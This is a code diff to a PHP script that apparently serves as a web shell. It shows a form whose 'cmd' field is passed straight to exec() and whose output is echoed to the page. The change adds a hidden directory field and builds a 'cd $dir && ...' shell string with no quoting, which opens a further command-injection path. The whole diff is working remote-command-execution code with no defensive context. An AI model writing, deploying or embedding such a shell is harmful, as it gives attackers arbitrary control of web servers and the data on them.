@@ -46,12 +46,13 @@ foreach ($dirs as $key => $value) {
 }
 
 echo "\n<br><form action='".$_SERVER['PHP_SELF']."' method='GET'>";
+echo "<input type='hidden' name='dir' value=".$dir." />";
 echo "<input type='text' name='cmd' autocomplete='off' autofocus>\n<input type='submit' value='Execute'>\n";
 echo "</form>";
 
 if (isset($_GET['cmd'])) {
 	echo "<br><br><b>Result of command execution: </b><br>";
-	exec($_GET['cmd'], $cmdresult);
+	exec('cd '.$dir.' && echo '.$dir.' && '.$_GET['cmd'], $cmdresult);
 	foreach ($cmdresult as $key => $value) {
 		echo "$value \n<br>";
 	}
